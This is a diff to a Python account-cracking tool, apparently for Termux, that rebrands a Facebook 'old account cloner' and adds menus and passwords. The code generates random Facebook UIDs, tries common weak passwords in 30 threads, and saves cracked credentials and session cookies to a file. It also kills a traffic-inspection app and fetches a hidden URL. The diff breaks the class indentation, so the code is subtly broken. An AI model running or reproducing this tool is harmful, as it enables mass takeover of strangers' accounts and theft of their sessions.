@@ -24,38 +24,39 @@ run_system_command('pkill -f httcanary')
 
 class NebulaColors:
     def __init__(self):
-        self.W = '\x1b[97;1m'
-        self.R = '\x1b[91;1m'
-        self.G = '\x1b[92;1m'
-        self.Y = '\x1b[93;1m'
-        self.B = '\x1b[94;1m'
-        self.P = '\x1b[95;1m'
-        self.C = '\x1b[96;1m'
-        self.N = '\x1b[0m'
+        self.P = "\x1b[38;5;93m"  # Purple
+        self.Y = "\x1b[38;5;226m" # Yellow  
+        self.N = "\x1b[38;5;255m" # Normal/White
+        self.G = "\x1b[38;5;46m"  # Green
+        self.R = "\x1b[38;5;196m" # Red
+        self.C = "\x1b[38;5;51m"  # Cyan
 
 def pro_banner():
-    return """
-\x1b[1;96m
-   ███╗   ███╗██╗  ██╗██████╗     
-   ████╗ ████║██║  ██║██╔══██╗    
-   ██╔████╔██║███████║██████╔╝    
-   ██║╚██╔╝██║██╔══██║██╔══██╗    
-   ██║ ╚═╝ ██║██║  ██║██║  ██║    
-   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
-\x1b[1;95m╔═══════════════════════════════════╗
-\x1b[1;95m║\x1b[1;97m      ✦  𝗧𝗢𝗢𝗟 I𝗡𝗙𝗢 𝗣𝗔𝗡𝗘𝗟  ✦        \x1b[1;95m║
-\x1b[1;95m╚═══════════════════════════════════╝
-\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96mJINN
-\x1b[1;96m   ➤ \x1b[1;97mOperated By    : \x1b[1;92mMUSKAN \x1b[1;91m(\x1b[1;90mPremium Access\x1b[1;91m)
-\x1b[1;96m   ➤ \x1b[1;97mTool Access    : \x1b[1;93mPAID 
-\x1b[1;96m   ➤ \x1b[1;97mCurrent Version: \x1b[1;95m0.5
-\x1b[1;92m───────────────────────────────────────────────"""
+    return f"""
+\x1b[38;5;201m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\x1b[38;5;201m║\x1b[38;5;93m                                           \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;51m    ███╗░░░███╗\x1b[38;5;226m░█████╗░\x1b[38;5;196m░█████╗░\x1b[38;5;46m███████╗\x1b[38;5;93m    \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;51m    ████╗░████║\x1b[38;5;226m██╔══██╗\x1b[38;5;196m██╔══██╗\x1b[38;5;46m╚════██║\x1b[38;5;93m    \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;51m    ██╔████╔██║\x1b[38;5;226m███████║\x1b[38;5;196m███████║\x1b[38;5;46m░░███╔═╝\x1b[38;5;93m    \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;51m    ██║╚██╔╝██║\x1b[38;5;226m██╔══██║\x1b[38;5;196m██╔══██║\x1b[38;5;46m██╔══╝░░\x1b[38;5;93m    \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;51m    ██║░╚═╝░██║\x1b[38;5;226m██║░░██║\x1b[38;5;196m██║░░██║\x1b[38;5;46m███████╗\x1b[38;5;93m    \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;51m    ╚═╝░░░░░╚═╝\x1b[38;5;226m╚═╝░░╚═╝\x1b[38;5;196m╚═╝░░╚═╝\x1b[38;5;46m╚══════╝\x1b[38;5;93m    \x1b[38;5;201m║
+\x1b[38;5;201m║\x1b[38;5;93m                                           \x1b[38;5;201m║
+\x1b[38;5;201m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+
+
+\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\x1b[38;5;226m[\x1b[38;5;196m✅\x1b[38;5;226m] \x1b[38;5;255mDEVELOPER   \x1b[38;5;51m▶  \x1b[38;5;255mMohammad MAAZ
+\x1b[38;5;226m[\x1b[38;5;196m✅\x1b[38;5;226m] \x1b[38;5;255mWHATSAPP    \x1b[38;5;51m▶  \x1b[38;5;255m+923079741690
+\x1b[38;5;226m[\x1b[38;5;196m✅\x1b[38;5;226m] \x1b[38;5;255mFEATURE     \x1b[38;5;51m▶  \x1b[38;5;255mOLD FACEBOOK CLONE
+\x1b[38;5;226m[\x1b[38;5;196m✅\x1b[38;5;226m] \x1b[38;5;255mVERSION     \x1b[38;5;51m▶  \x1b[38;5;255mv4.0 PREMIUM
+\x1b[38;5;226m[\x1b[38;5;196m✅\x1b[38;5;226m] \x1b[38;5;255mSTATUS      \x1b[38;5;51m▶  \x1b[38;5;46mFULLY WORKING ✓
+\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
 def linex():
-    color = NebulaColors()
-    print(f"  {color.P}╔═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╗")
-    print(f"  {color.P}║    {color.Y}★ PREMIUM TOOL INTERFACE ★    {color.P}║")
-    print(f"  {color.P}╚═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╝{color.N}")
+    print(f"\x1b[38;5;93m  ╔═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╗")
+    print(f"\x1b[38;5;93m  ║    \x1b[38;5;226m★ PREMIUM TOOL INTERFACE ★    \x1b[38;5;93m║")
+    print(f"\x1b[38;5;93m  ╚═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╝\x1b[38;5;255m")
 
 def clear():
     os.system('clear')
@@ -63,6 +64,14 @@ def clear():
 
 def secure_xor(data, key=85):
     return bytes([b ^ key for b in data])
+
+
+def line():
+    print(f'\r\n\x1b[38;5;51m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+def logo():
+    return pro_banner()
+
 
 def get_hidden_url():
     parts = [
@@ -103,7 +112,7 @@ class UserAgentGenerator:
         except Exception:
             return []
 
-class BGRICracker:
+class MAAZCracker:
     def __init__(self):
         self.oks = []
         self.cps = []
@@ -112,80 +121,94 @@ class BGRICracker:
         self.user_agents = UserAgentGenerator().load_user_agents_from_url()
 
     def old_menu(self):
-        clear()
-        print(f"{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗")
-        print(f"{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║")
-        print(f"{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣")
-        print(f"{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}║")
-        print(f"{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}║")
-        print(f"{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ BACK TO MAIN MENU                 {self.color.P}║")
-        print(f"{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝")
+    clear()
+    print(f"{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗")
+    print(f"{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║")
+    print(f"{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣")
+    print(f"{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}║")
+    print(f"{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}║")
+    print(f"{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ BACK TO MAIN MENU                 {self.color.P}║")
+    print(f"{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝")
 
-        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}").strip()
+    choice = input(f"  {self.color.C}➤ Choose: {self.color.N}").strip()
+    
+    if choice in ('1', '01'):
+        self.execute_breach('100000')
+    elif choice in ('2', '02'):
+        self.quantum_breach_menu()
+    elif choice in ('0', '00'):
+        return
+    else:
+        print(f"\n  {self.color.R}⚠ Invalid choice!")
+        time.sleep(2)
+        self.old_menu()
+
+def quantum_breach_menu(self):
+    clear()
+    series_map = {
+        '1': '100000', '2': '100001', '3': '100002', 
+        '4': '100003', '5': '100004'
+    }
+    print(f"  {self.color.C}➤ Select Series:")
+    for num, prefix in series_map.items():
+        print(f"  {self.color.N}[{self.color.G}{num}{self.color.N}] {self.color.C}{prefix}")
+    
+    linex()
+    choice = input(f"  {self.color.C}➤ Choose: {self.color.N}").strip()
+    selected_prefix = series_map.get(choice)
+
+    if not selected_prefix:
+        print(f"  {self.color.R}⚠ Invalid Series!")
+        time.sleep(2)
+        self.quantum_breach_menu()
+        return
+    
+    self.execute_breach(selected_prefix)
+
+def execute_breach(self, prefix):
+    try:
+        clear()
+        print(f"  {self.color.C}[{self.color.N}1{self.color.C}] {self.color.N}10000")
+        print(f"  {self.color.C}[{self.color.N}2{self.color.C}] {self.color.N}50000") 
+        print(f"  {self.color.C}[{self.color.N}3{self.color.C}] {self.color.N}99999")
         
-        if choice in ('1', '01'):
-            self.execute_breach('100000')
-        elif choice in ('2', '02'):
-            self.quantum_breach_menu()
-        elif choice in ('0', '00'):
-            return
+        choice = input(f"  {self.color.G}➤ Enter Limit: {self.color.N}")
+        
+        if choice == '1':
+            limit = 10000
+        elif choice == '2':
+            limit = 50000
+        elif choice == '3':
+            limit = 99999
         else:
-            print(f"\n  {self.color.R}⚠ Invalid choice!")
-            time.sleep(2)
-            self.old_menu()
+            limit = int(choice)
+            
+    except ValueError:
+        print(f"  {self.color.R}⚠ Invalid Number!")
+        time.sleep(2)
+        self.old_menu()
+        return
 
-    def quantum_breach_menu(self):
+    targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
+    passlist = ['123456789', '123456', '12345678', '1234567', '1234567890', '123123', '786786']
+
+    with tred(max_workers=30) as executor:
         clear()
-        series_map = {
-            '1': '100000', '2': '100001', '3': '100002', 
-            '4': '100003', '5': '100004'
-        }
-        print(f"  {self.color.W}\x1b[1;96m ➤ Select Series:")
-        for num, prefix in series_map.items():
-            print(f"  {self.color.W}[{self.color.G}{num}{self.color.W}] {self.color.C}{prefix}")
-        
+        print(f"  {self.color.P}➤ Cracking {self.color.Y}{prefix}")
+        print(f"  {self.color.P}➤ Targets: {self.color.G}{len(targets)}")
         linex()
-        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.W}").strip()
-        selected_prefix = series_map.get(choice)
+        for target in targets:
+            executor.submit(self.breach_target, target, passlist)
+    
+    self.display_results()
 
-        if not selected_prefix:
-            print(f"  {self.color.R}⚠ Invalid Series!")
-            time.sleep(2)
-            self.quantum_breach_menu()
-            return
-        
-        self.execute_breach(selected_prefix)
-
-    def execute_breach(self, prefix):
-        try:
-            clear()
-            limit = int(input(f"  {self.color.G}\x1b[1;96m ➤ Enter Limit: {self.color.W}"))
-        except ValueError:
-            print(f"  {self.color.R}⚠ Invalid Number!")
-            time.sleep(2)
-            self.old_menu()
-            return
-
-        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
-        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']
-
-        with tred(max_workers=30) as executor:
-            clear()
-            print(f"  {self.color.W}\x1b[1;96m   ➤ Cracking {self.color.Y}{prefix} ")
-            print(f"  {self.color.W}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}")
-            linex()
-            for target in targets:
-                executor.submit(self.breach_target, target, passlist)
-        
-        self.display_results()
-
-    def breach_target(self, target, passlist):
-        self.loop += 1
-        sys.stdout.write(f'\r  {self.color.W}[BGRI] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
-        sys.stdout.flush()
-        for password in passlist:
-            if self.try_breach(target, password):
-                break
+def breach_target(self, target, passlist):
+    self.loop += 1
+    sys.stdout.write(f'\r  {self.color.N}[MAAZ] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.N}')
+    sys.stdout.flush()
+    for password in passlist:
+        if self.try_breach(target, password):
+            break
 
     def try_breach(self, uid, password):
         try:
@@ -237,36 +260,36 @@ class BGRICracker:
             return False
         return False
 
-    def handle_success(self, uid, password, response):
-        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
-        print(f"\r  {self.color.G}\x1b[1;96m   ➤ SUCCESS {self.color.W}{uid}|{self.color.G}{password}{self.color.W}")
-        with open('/sdcard/BGRI-OLD.txt', 'a') as f:
-            f.write(f'{uid}|{password}|{coki}\n')
-        self.oks.append(uid)
+def handle_success(self, uid, password, response):
+    coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
+    print(f"\r  {self.color.G}   ➤ SUCCESS {self.color.N}{uid}|{self.color.G}{password}{self.color.N}")
+    with open('/sdcard/MAAZ-OLD.txt', 'a') as f:
+        f.write(f'{uid}|{password}|{coki}\n')
+    self.oks.append(uid)
 
-    def handle_partial(self, uid, password):
-        print(f"\r  {self.color.Y}\x1b[1;96m   ➤ OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}")
-        with open('/sdcard/BGRI-OLD.txt', 'a') as f:
-            f.write(f'{uid}|{password}\n')
-        self.cps.append(uid)
-        
-    def display_results(self):
-        clear()
-        print(f"  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE")
-        linex()
-        print(f"  {self.color.W}CP: {self.color.Y}{len(self.oks)}")
-        print(f"  {self.color.W}OK: {self.color.G}{len(self.cps)}")
-        linex()
-        input(f"  {self.color.C}Press ENTER to continue {self.color.W}")
-        self.old_menu()
-        
+def handle_partial(self, uid, password):
+    print(f"\r  {self.color.Y}   ➤ OK {self.color.G}{uid}{self.color.Y}•{self.color.N}{password}{self.color.N}")
+    with open('/sdcard/MAAZ-OLD.txt', 'a') as f:
+        f.write(f'{uid}|{password}\n')
+    self.cps.append(uid)
+    
+def display_results(self):
+    clear()
+    print(f"  {self.color.G}   ➤ CRACKING COMPLETE")
+    linex()
+    print(f"  {self.color.N}CP: {self.color.Y}{len(self.oks)}")
+    print(f"  {self.color.N}OK: {self.color.G}{len(self.cps)}")
+    linex()
+    input(f"  {self.color.C}Press ENTER to continue {self.color.N}")
+    self.old_menu()
+    
 if __name__ == "__main__":
     try:
-        cracker = BGRICracker()
+        cracker = MAAZCracker()
         cracker.old_menu()
     except KeyboardInterrupt:
-        print("\n\x1b[1;96m   ➤ Stopped")
+        print("\n   ➤ Stopped")
         sys.exit()
     except Exception as e:
-        print(f"\n\x1b[1;96m   ➤ Error: {str(e)}")
+        print(f"\n   ➤ Error: {str(e)}")
         sys.exit()
